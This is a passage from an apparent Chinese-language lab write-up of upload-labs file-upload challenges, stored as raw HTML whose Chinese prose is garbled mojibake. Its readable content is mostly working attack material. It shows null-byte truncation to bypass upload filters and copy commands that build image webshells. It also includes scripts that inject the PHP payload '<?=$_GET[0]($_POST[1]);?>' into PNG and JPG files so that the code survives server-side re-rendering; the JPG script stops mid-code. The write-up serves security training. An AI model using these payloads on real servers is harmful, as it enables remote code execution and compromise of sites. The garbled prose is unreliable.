ä¸€ä¸ªæ–‡ä»¶ä¹‹åå°±ä¼šgetä¸€ä¸ªæ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œäºæ˜¯åˆ©ç”¨%00æˆªæ–­ï¼Œä½¿å¾—æ–‡ä»¶è·¯å¾„ä¸ºupload/1.php%00(æ–‡ä»¶å)ï¼Œåé¢çš„æ–‡ä»¶æ²¡å°±å°±æ²¡è¯»å–äº†ï¼Œè¿™æ ·è®¿é—®upload/1.phpå³å¯è·å¾—æœ¨é©¬è·¯å¾„ã€‚</p><p>ç‰ˆæœ¬è¦æ±‚ï¼š</p><blockquote><p>phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜</p><p>magic_quotes_gpcéœ€è¦ä¸ºOFFçŠ¶æ€</p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>ä¸ä¸Šé¢˜ä¸ä¸€æ ·è¿™é¢˜æ”¹ç”¨äº†POSTæ–¹æ³•ï¼Œä¸€æ ·%00æˆªæ–­æŠ“åŒ…æ”¹å³å¯ï¼Œphpç‰ˆæœ¬éœ€è¦æ³¨æ„</p><blockquote><p>å› ä¸ºæ˜¯åå…­è¿›åˆ¶æ‰€ä»¥è¿™ç§æˆªæ–­å«åšæ˜¯<code>0x00æˆªæ–­</code>ï¼Œå…¶å®æ˜¯<code>%00æˆªæ–­</code>æœ€ç»ˆè¢«<code>urlè§£ç </code>è¿˜æ˜¯ä¼šå˜æˆ<code>0x00</code>çš„ã€‚åœ¨<code>url</code>ä¸­<code>%00</code>è¡¨ç¤º<code>ascll</code>ç ä¸­çš„<code>0</code>ï¼Œè€Œ<code>ascii</code>ä¸­<code>0</code>ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“<code>url</code>ä¸­å‡ºç°<code>%00</code>æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸã€‚</p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>cmdåˆ°ä¸¤ä¸ªæ–‡ä»¶æ‰€åœ¨è·¯å¾„ä¸‹ç”¨copyå‘½ä»¤åˆ¶ä½œå›¾ç‰‡é©¬</p><blockquote><p>pngï¼šcopy 1.png/b + 1.php/a shell.png</p><p>jpgï¼šcopy 1.jpg/b + 1.php/a shell.jpg</p><p>jpgï¼šcopy 1.gif/b + 1.php/a shell.gif</p></blockquote><p>åˆ¶ä½œå¥½åä¸Šä¼ ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢getfileå‚æ•°è¿›è¡Œè¯»å–è§£æå³å¯ <code>?file=./upload/6420200209090636.png</code>ï¼ˆä¸‰ç§éƒ½ä¸€æ ·ï¼‰</p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>åå°ä»£ç æ”¹äº†ï¼Œç”¨çš„getimagesizeå‡½æ•°åˆ¤æ–­åç¼€ï¼Œä½†æ˜¯è§£é¢˜æ–¹æ³•è¿˜æ˜¯å’Œä¸Šé¢˜ä¸€æ ·</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>æœ¬é¢˜ç”¨äº†php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå›¾ç‰‡é©¬ä¸€æ ·å¯ä»¥ç»•è¿‡</p><blockquote><p>ç”¨äºè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾å</p><p>å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å›false</p></blockquote><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><p>è¿™é¢˜å­˜åœ¨å¯¹å›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“</p><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>å°†åšå¥½çš„GIFå›¾ç‰‡é©¬ä¸Šä¼ ä¸Šå»ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè¯»å–ï¼Œå‘ç°å›¾ç‰‡ä¸­çš„phpä»£ç å¹¶æ²¡æœ‰è¢«è§£æï¼Œå¹¶ä¸”å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“é‡æ„ï¼Œå†…å®¹è¢«æ”¹å†™ï¼Œäºæ˜¯ä½¿ç”¨GIFå›¾çš„å¤„ç†æ–¹æ³•ï¼Œå°†å›¾ç‰‡å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œä¸ä¸Šä¼ å‰çš„å›¾ç‰‡é©¬ä½œæ¯”è¾ƒï¼Œå‘ç°æœ‰ä¸€éƒ¨åˆ†æ²¡æœ‰è¢«é‡å†™ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œäºæ˜¯å°†ä¸€å¥è¯æ’å…¥åˆ°è¿™ä¸€éƒ¨åˆ†å†…å®¹ä¸­ï¼Œä¿å­˜ï¼Œé‡æ–°ä¸Šä¼ ï¼ŒæˆåŠŸè§£æ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209171705862.png" alt loading="lazy"></p><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><h5 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h5><p>è¿™é‡Œæœ‰å›½å¤–å¤§ç‰›çš„è„šæœ¬</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ä½†æˆ‘TMç«Ÿç„¶ä¸çŸ¥é“<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>è¿™ä¸ªæ€ä¹ˆåˆ©ç”¨ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼</p><p>åˆ¶ä½œå¥½pngä¸Šä¼ åä¸‹è½½ä¸‹æ¥æˆåŠŸé•¶å…¥äº†é‚£å¥è¯ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ã€‚ã€‚ã€‚ç®—äº†å…ˆæ”¾è¿™é‡Œ</p><h5 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h5><p>åœ¨PLTEæ•°æ®å—ååŠ å…¥ä¸€å¥è¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201526629.png" alt loading="lazy"></p><p>è®¡ç®—PLTEæ•°æ®å—çš„CRC<br>CRCè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> repng <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'2.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> png<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>png<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>hexstr <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' PLTE crc '''</span>data <span class="token operator">=</span>  <span class="token string">'504c5445'</span><span class="token operator">+</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'504c5445(.*?)49444154'</span><span class="token punctuation">,</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span></code></pre><p>è¿ç®—ç»“æœï¼š526579b0</p><p>ä¿®æ”¹CRCå€¼</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201005832.png" alt loading="lazy"></p><p>å°†è¿™ä¸ªå›¾ç‰‡ä¸Šä¼ å°±ä¼ ä¸Šä¸€å¥è¯äº†ï¼ˆåæ­£æˆ‘æ˜¯æ²¡æå‡ºæ¥ï¼‰ã€‚ã€‚ã€‚<a href="https://github.com/Yang1k/upload-labs-Pass16">åŸæ–‡ä¸­ç´ æé“¾æ¥</a></p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>é¦–å…ˆå‡†å¤‡ä¸€å¼ .jpgåç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šå»ç„¶åå°†äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥å‘½åä¸º1.jpg</p><p>ç„¶åä¸Šå›½å¤–å¤§ä½¬è„šæœ¬ï¼Œå¹¶ä¸”å‘½åä¸º<code>jpg_payload.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=phpinfo();?>"</span><span class="token punctuation">;</span> <span class="token comment">/*è¿™é‡Œæ’å…¥æƒ³æ’å…¥çš„ä¸€å¥è¯ä»£ç */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span 